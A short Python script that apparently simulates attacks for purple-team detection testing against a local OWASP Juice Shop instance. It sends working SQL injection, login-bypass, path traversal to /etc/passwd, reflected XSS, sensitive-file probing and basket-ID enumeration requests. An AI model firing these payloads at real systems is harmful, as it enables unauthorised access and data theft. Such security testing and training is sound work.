import time
import requests

TARGET = "http://localhost:3000"

def run_attack_suite():
    session = requests.Session()

    print("[*] Iniciando Bateria de Simulação Purple Team...")

    # 1. SQL Injection (T1190)
    print("  [>] Executando SQLi em busca de produtos...")
    session.get(f"{TARGET}/rest/products/search?q=' OR 1=1--")

    print("  [>] Executando SQLi Auth Bypass...")
    session.post(f"{TARGET}/rest/user/login", json={
        "email": "admin@juice-sh.op' OR 1=1--",
        "password": "pwned"
    })

    # 2. Path Traversal (T1083)
    print("  [>] Executando Directory/Path Traversal...")
    session.get(f"{TARGET}/public/images/ftp/../../../../etc/passwd")
    session.get(f"{TARGET}/ftp/..%2f..%2f..%2fetc/passwd")

    # 3. Cross-Site Scripting - XSS (T1059.007)
    print("  [>] Executando Reflected XSS...")
    session.get(f"{TARGET}/rest/products/search?q=<script>alert(1)</script>")
    session.get(f"{TARGET}/rest/products/search?q=%3Ciframe%20src%3Djavascript:alert(1)%3E")

    # 4. Reconnaissance & Enumeration (T1595.003)
    print("  [>] Executando Enumeração de Diretórios e Arquivos Sensíveis...")
    wordlist = ["/.env", "/admin", "/backup", "/.git/config", "/package.json.bak", "/server.js"]
    for path in wordlist:
        session.get(f"{TARGET}{path}")

    # 5. Broken Object Level Authorization - BOLA (API1:2023)
    print("  [>] Executando Enumeração BOLA em Cestas de Usuários...")
    for basket_id in range(1, 5):
        session.get(f"{TARGET}/rest/basket/{basket_id}")

    print("[+] Simulação concluída. Telemetria gerada no OWASP Juice Shop.")

if __name__ == "__main__":
    run_attack_suite()
